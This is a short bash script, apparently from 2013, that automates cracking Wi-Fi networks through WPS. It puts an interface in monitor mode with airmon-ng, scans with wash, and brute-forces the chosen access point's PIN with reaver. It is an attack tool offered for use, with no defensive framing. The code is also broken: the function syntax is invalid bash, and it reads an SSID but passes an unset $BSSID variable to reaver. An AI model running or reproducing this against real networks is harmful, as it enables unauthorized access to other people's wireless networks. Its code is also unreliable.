#!/bin/bash
# crack WPS Wireless Networks
# (w) Neo 2013
iface=$1

echo "[*] Crack WPS Wireless Networks"
echo "[*] Author: Neo (@neo_hac0x)"
echo "                            "
function log(data) {
	if [ ! -f wps_pwn.log ]
	then
		echo "# Logfile of wps_pwn.sh" >> wps_pwn.log
		echo " " >> wps_pwn.log
		echo $data >> wps_pwn.log
	else
		echo $data >> wps_pwn.log
	fi
}

case $iface in
    wlan*)
  touch wps_pwn.log
	airmon-ng start $iface
	xterm -e "wash -s -i mon0" 
	echo "Which Net do you want to crack ?"
	read SSID
	log(reaver -i mon0 -b $BSSID -vv -d 0)
	airmon-ng stop $iface
	;;
    *)
	echo "Usage: $0 interface"
	;;
esac
